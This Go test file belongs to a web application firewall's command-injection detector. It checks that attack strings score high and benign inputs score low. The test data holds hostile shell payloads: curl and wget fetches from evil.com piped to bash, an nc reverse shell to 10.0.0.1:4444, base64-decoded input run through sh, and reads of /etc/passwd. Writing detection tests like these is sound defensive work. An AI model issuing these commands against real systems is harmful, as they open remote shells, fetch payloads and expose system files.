package cmdi

import (
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

// Attack payloads that MUST be detected with score >= 50
var attackPayloads = []struct {
	name     string
	input    string
	minScore int
}{
	{"semicolon whoami", "; whoami", 65},
	{"semicolon cat passwd", "; cat /etc/passwd", 75},
	{"pipe id", "| id", 65},
	{"backtick id", "`id`", 80},
	{"dollar paren whoami", "$(whoami)", 80},
	{"and operator ls", "test && ls -la", 65},
	{"or operator id", "test || id", 65},
	{"bin bash path", "/bin/bash -c 'id'", 80},
	{"bin sh path", "/bin/sh -c 'whoami'", 80},
	{"python exec", "python -c 'import socket'", 80},
	{"curl reverse shell", "; curl http://evil.com/shell.sh | bash", 50},
	{"nc reverse shell", "; nc -e /bin/sh 10.0.0.1 4444", 75},
	{"base64 pipe", "echo dGVzdA== | base64 -d | sh", 50},
	{"newline injection", "test%0awhoami", 60},
	{"perl exec", "perl -e 'exec \"/bin/sh\"'", 80},
	{"wget download", "; wget http://evil.com/backdoor", 75},
}

// Benign inputs that must NOT trigger high scores
var benignInputs = []struct {
	name     string
	input    string
	maxScore int
}{
	{"normal text", "hello world", 0},
	{"email address", "user@example.com", 0},
	{"json data", `{"name": "John", "age": 30}`, 0},
	{"url with params", "https://example.com/page?q=test&lang=en", 0},
	{"math expression", "2 + 3 = 5", 0},
	{"filepath", "/home/user/documents/report.pdf", 0},
	{"simple sentence", "the quick brown fox jumps over the lazy dog", 0},
}

func TestDetect_AttackPayloads(t *testing.T) {
	for _, tt := range attackPayloads {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore < tt.minScore {
				t.Errorf("input=%q: total score %d < minimum %d\nfindings: %+v",
					tt.input, totalScore, tt.minScore, findings)
			}
		})
	}
}

func TestDetect_BenignInputs(t *testing.T) {
	for _, tt := range benignInputs {
		t.Run(tt.name, func(t *testing.T) {
			findings := Detect(tt.input, "query")
			totalScore := 0
			for _, f := range findings {
				totalScore += f.Score
			}
			if totalScore > tt.maxScore {
				t.Errorf("input=%q: total score %d > maximum %d\nfindings: %+v",
					tt.input, totalScore, tt.maxScore, findings)
			}
		})
	}
}

func TestDetect_EmptyInput(t *testing.T) {
	findings := Detect("", "query")
	if findings != nil {
		t.Errorf("expected nil findings for empty input, got %v", findings)
	}
}

func TestDetect_FindingFields(t *testing.T) {
	findings := Detect("; whoami", "query")
	if len(findings) == 0 {
		t.Fatal("expected at least one finding")
	}

	for _, f := range findings {
		if f.DetectorName != "cmdi" {
			t.Errorf("DetectorName: expected 'cmdi', got %q", f.DetectorName)
		}
		if f.Category != "cmdi" {
			t.Errorf("Category: expected 'cmdi', got %q", f.Category)
		}
		if f.Location != "query" {
			t.Errorf("Location: expected 'query', got %q", f.Location)
		}
		if f.Score <= 0 {
			t.Errorf("Score should be > 0, got %d", f.Score)
		}
		if f.Description == "" {
			t.Error("Description should not be empty")
		}
		if f.Confidence <= 0 || f.Confidence > 1.0 {
			t.Errorf("Confidence should be in (0, 1.0], got %f", f.Confidence)
		}
	}
}

func TestDetector_Integration(t *testing.T) {
	det := NewDetector(true, 1.0)

	var _ engine.Detector = det

	if det.Name() != "cmdi-detector" {
		t.Errorf("expected name 'cmdi-detector', got %q", det.Name())
	}
	if det.DetectorName() != "cmdi" {
		t.Errorf("expected detector name 'cmdi', got %q", det.DetectorName())
	}
	if len(det.Patterns()) == 0 {
		t.Error("expected non-empty patterns list")
	}

	ctx := &engine.RequestContext{
		NormalizedPath: "/api/exec",
		NormalizedQuery: map[string][]string{
			"cmd": {"; whoami"},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionLog {
		t.Errorf("expected ActionLog, got %v", result.Action)
	}
	if result.Score < 50 {
		t.Errorf("expected score >= 50, got %d", result.Score)
	}
	if len(result.Findings) == 0 {
		t.Error("expected findings for CMDi payload")
	}
}

func TestDetector_Disabled(t *testing.T) {
	det := NewDetector(false, 1.0)

	ctx := &engine.RequestContext{
		NormalizedPath: "; whoami",
		NormalizedQuery: map[string][]string{
			"cmd": {"; cat /etc/passwd"},
		},
		Headers: map[string][]string{},
		Cookies: map[string]string{},
	}

	result := det.Process(ctx)

	if result.Action != engine.ActionPass {
		t.Errorf("disabled detector should return ActionPass, got %v", result.Action)
	}
	if len(result.Findings) != 0 {
		t.Errorf("disabled detector should produce no findings, got %d", len(result.Findings))
	}
}

func TestDetector_Multiplier(t *testing.T) {
	input := "; whoami"

	det1 := NewDetector(true, 1.0)
	ctx1 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{"cmd": {input}},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result1 := det1.Process(ctx1)

	det2 := NewDetector(true, 2.0)
	ctx2 := &engine.RequestContext{
		NormalizedQuery: map[string][]string{"cmd": {input}},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result2 := det2.Process(ctx2)

	if result1.Score == 0 {
		t.Fatal("baseline score should not be 0")
	}
	if result2.Score < result1.Score {
		t.Errorf("2x multiplier score %d should be >= 1x score %d", result2.Score, result1.Score)
	}
}

func TestCommandDatabase(t *testing.T) {
	if len(commandDatabase) < 60 {
		t.Errorf("expected at least 60 commands in database, got %d", len(commandDatabase))
	}

	mustHave := []string{
		"cat", "ls", "whoami", "id", "uname", "curl", "wget", "nc",
		"bash", "sh", "python", "perl", "ruby", "php", "chmod",
		"base64", "find", "grep", "mysql", "redis-cli",
	}
	for _, cmd := range mustHave {
		if !IsCommand(cmd) {
			t.Errorf("command %q should be in database", cmd)
		}
	}
}

func TestShellMetachars(t *testing.T) {
	tests := []struct {
		input string
		want  bool
	}{
		{"; ls", true},
		{"| grep", true},
		{"`id`", true},
		{"$(whoami)", true},
		{"&& ls", true},
		{"|| id", true},
		{"> /tmp/out", true},
		{"hello world", false},
		{"normal text", false},
	}

	for _, tt := range tests {
		got := HasShellMetachar(tt.input)
		if got != tt.want {
			t.Errorf("HasShellMetachar(%q) = %v, want %v", tt.input, got, tt.want)
		}
	}
}

func BenchmarkDetect(b *testing.B) {
	input := "; whoami && cat /etc/passwd"
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		Detect(input, "query")
	}
}

// --- Additional tests for uncovered code paths ---

func TestShellMetacharList(t *testing.T) {
	list := ShellMetacharList()
	if len(list) == 0 {
		t.Fatal("expected non-empty shell metachar list")
	}
	found := map[string]bool{}
	for _, c := range list {
		found[c] = true
	}
	for _, expected := range []string{";", "|", "`", "$(", "&&", "||", ">", ">>"} {
		if !found[expected] {
			t.Errorf("expected %q in ShellMetacharList", expected)
		}
	}
}

func TestDetect_RedirectionOperator(t *testing.T) {
	findings := Detect("test > /tmp/out", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore == 0 {
		t.Error("expected non-zero score for redirection operator")
	}
}

func TestDetect_AppendRedirection(t *testing.T) {
	findings := Detect("test >> /tmp/out", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore == 0 {
		t.Error("expected non-zero score for append redirection operator")
	}
}

func TestDetect_RedirectionSkipsHTML(t *testing.T) {
	findings := Detect("<div>hello</div>", "body")
	redirectFound := false
	for _, f := range findings {
		if strings.Contains(f.Description, "redirection") {
			redirectFound = true
		}
	}
	if redirectFound {
		t.Error("HTML tags should not trigger redirection detection")
	}
}

func TestDetect_RedirectionSkipsArrow(t *testing.T) {
	findings := Detect("result => value", "body")
	redirectFound := false
	for _, f := range findings {
		if strings.Contains(f.Description, "redirection") {
			redirectFound = true
		}
	}
	if redirectFound {
		t.Error("arrow operator should not trigger redirection detection")
	}
}

func TestDetect_RedirectionSkipsURLSlash(t *testing.T) {
	findings := Detect("abc/>more", "body")
	redirectFound := false
	for _, f := range findings {
		if strings.Contains(f.Description, "redirection") {
			redirectFound = true
		}
	}
	if redirectFound {
		t.Error("slash+> should not trigger redirection detection")
	}
}

func TestDetect_NetworkCommand(t *testing.T) {
	findings := Detect("; curl http://evil.com", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 75 {
		t.Errorf("expected score >= 75 for network command, got %d", totalScore)
	}
}

func TestDetect_PipeWithReconCommand(t *testing.T) {
	findings := Detect("test | whoami", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 65 {
		t.Errorf("expected score >= 65 for pipe with recon command, got %d", totalScore)
	}
}

func TestDetect_PipeWithNetworkCommand(t *testing.T) {
	findings := Detect("test | nc 10.0.0.1 4444", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 75 {
		t.Errorf("expected score >= 75 for pipe with network command, got %d", totalScore)
	}
}

func TestDetect_ANDWithNetworkCommand(t *testing.T) {
	findings := Detect("test && wget http://evil.com/shell", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for && with network command, got %d", totalScore)
	}
}

func TestDetect_ORWithCommand(t *testing.T) {
	findings := Detect("test || cat /etc/passwd", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 65 {
		t.Errorf("expected score >= 65 for || with recon command, got %d", totalScore)
	}
}

func TestDetect_DollarParenNoClose(t *testing.T) {
	findings := Detect("$(whoami", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for $( without close, got %d", totalScore)
	}
}

func TestDetect_BacktickWithCommand(t *testing.T) {
	findings := Detect("`cat /etc/passwd`", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 80 {
		t.Errorf("expected score >= 80 for backtick with command, got %d", totalScore)
	}
}

func TestDetect_BacktickNonCommand(t *testing.T) {
	findings := Detect("`notacommand`", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for backtick substitution, got %d", totalScore)
	}
}

func TestDetect_ShellPaths(t *testing.T) {
	paths := []string{
		"/bin/bash", "/bin/sh", "/bin/zsh",
		"/usr/bin/python", "/usr/bin/perl", "/usr/bin/ruby",
		"/usr/bin/env bash",
	}
	for _, p := range paths {
		findings := Detect(p, "query")
		totalScore := 0
		for _, f := range findings {
			totalScore += f.Score
		}
		if totalScore < 80 {
			t.Errorf("expected score >= 80 for shell path %q, got %d", p, totalScore)
		}
	}
}

func TestDetect_InterpreterFlags(t *testing.T) {
	inputs := []string{
		"python -c import_os",
		"python3 -e exec_cmd",
		"perl -e system_id",
		"ruby -e exec_sh",
		"php -c phpinfo",
		"bash -c id",
		"sh -c whoami",
		"powershell -c Get-Process",
		"node -e require_cp",
	}
	for _, input := range inputs {
		findings := Detect(input, "query")
		totalScore := 0
		for _, f := range findings {
			totalScore += f.Score
		}
		if totalScore < 80 {
			t.Errorf("expected score >= 80 for interpreter flag %q, got %d", input, totalScore)
		}
	}
}

func TestDetect_Base64Pipe(t *testing.T) {
	findings := Detect("echo aWQ= | base64 -d | sh", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for base64 pipe, got %d", totalScore)
	}
}

func TestDetect_Base64Semicolon(t *testing.T) {
	findings := Detect("base64 -d < /tmp/payload; sh /tmp/decoded", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for base64 with semicolon, got %d", totalScore)
	}
}

func TestDetect_EncodedCRWithoutCommand(t *testing.T) {
	findings := Detect("test%0dhello", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore == 0 {
		t.Error("expected non-zero score for encoded CR injection")
	}
}

func TestDetect_EncodedNewlineWithoutCommand(t *testing.T) {
	findings := Detect("test%0anonsense", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore == 0 {
		t.Error("expected non-zero score for encoded newline injection without command")
	}
}

func TestDetect_LongMatchedValue(t *testing.T) {
	longInput := strings.Repeat("a", 300) + "; whoami"
	findings := Detect(longInput, "query")
	for _, f := range findings {
		if len(f.MatchedValue) > 200 {
			t.Errorf("MatchedValue should be truncated to <= 200, got length %d", len(f.MatchedValue))
		}
	}
}

func TestExtractFirstWord(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"", ""},
		{"  ", ""},
		{"word", "word"},
		{"first second", "first"},
		{"  trimmed  value", "trimmed"},
	}
	for _, tt := range tests {
		got := extractFirstWord(tt.input)
		if got != tt.want {
			t.Errorf("extractFirstWord(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestExtractContext_PatternNotFound(t *testing.T) {
	result := extractContext("short input", "notfound")
	if result != "short input" {
		t.Errorf("expected full input when pattern not found, got %q", result)
	}
}

func TestExtractContext_LongInputPatternNotFound(t *testing.T) {
	longInput := strings.Repeat("x", 200)
	result := extractContext(longInput, "notfound")
	if len(result) > 100 {
		t.Errorf("expected truncated input when pattern not found in long string, got length %d", len(result))
	}
}

func TestDetector_ProcessBody(t *testing.T) {
	det := NewDetector(true, 1.0)
	ctx := &engine.RequestContext{
		NormalizedPath:  "/api/exec",
		NormalizedQuery: map[string][]string{},
		NormalizedBody:  "; whoami",
		Headers:         map[string][]string{},
		Cookies:         map[string]string{},
	}
	result := det.Process(ctx)
	if result.Score < 50 {
		t.Errorf("expected score >= 50 for body injection, got %d", result.Score)
	}
}

func TestDetector_ProcessCookies(t *testing.T) {
	det := NewDetector(true, 1.0)
	ctx := &engine.RequestContext{
		NormalizedPath:  "/safe",
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{},
		Cookies:         map[string]string{"session": "; whoami"},
	}
	result := det.Process(ctx)
	if result.Score < 50 {
		t.Errorf("expected score >= 50 for cookie injection, got %d", result.Score)
	}
}

func TestDetector_ProcessRefererHeader(t *testing.T) {
	det := NewDetector(true, 1.0)
	ctx := &engine.RequestContext{
		NormalizedPath:  "/safe",
		NormalizedQuery: map[string][]string{},
		Headers:         map[string][]string{"Referer": {"; cat /etc/passwd"}},
		Cookies:         map[string]string{},
	}
	result := det.Process(ctx)
	if result.Score < 50 {
		t.Errorf("expected score >= 50 for referer header injection, got %d", result.Score)
	}
}

func TestDetector_ProcessCleanRequest(t *testing.T) {
	det := NewDetector(true, 1.0)
	ctx := &engine.RequestContext{
		NormalizedPath:  "/api/users",
		NormalizedQuery: map[string][]string{"name": {"John"}},
		Headers:         map[string][]string{"Referer": {"https://example.com"}},
		Cookies:         map[string]string{"session": "abc123"},
	}
	result := det.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("expected ActionPass for clean request, got %v", result.Action)
	}
}

func TestIsReconCommand(t *testing.T) {
	recon := []string{"id", "whoami", "uname", "hostname", "ifconfig", "ps", "env", "cat", "ls", "dir"}
	for _, cmd := range recon {
		if !isReconCommand(cmd) {
			t.Errorf("expected %q to be a recon command", cmd)
		}
	}
	if isReconCommand("wget") {
		t.Error("wget should not be a recon command")
	}
}

func TestIsNetworkCommand(t *testing.T) {
	network := []string{"nc", "ncat", "netcat", "curl", "wget", "ssh", "telnet"}
	for _, cmd := range network {
		if !isNetworkCommand(cmd) {
			t.Errorf("expected %q to be a network command", cmd)
		}
	}
	if isNetworkCommand("ls") {
		t.Error("ls should not be a network command")
	}
}

func TestDetect_SemicolonWithEmptyParts(t *testing.T) {
	findings := Detect("; ; ; ", "query")
	_ = findings // just verify no panic
}

func TestDetect_PipeWithGenericCommand(t *testing.T) {
	findings := Detect("test | grep pattern", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore < 50 {
		t.Errorf("expected score >= 50 for pipe with generic command, got %d", totalScore)
	}
}

func TestDetect_EncodedNewlineCROnlyWithCommand(t *testing.T) {
	findings := Detect("field=value%0dcat /etc/passwd", "query")
	totalScore := 0
	for _, f := range findings {
		totalScore += f.Score
	}
	if totalScore == 0 {
		t.Error("expected non-zero score for encoded newline with command")
	}
}
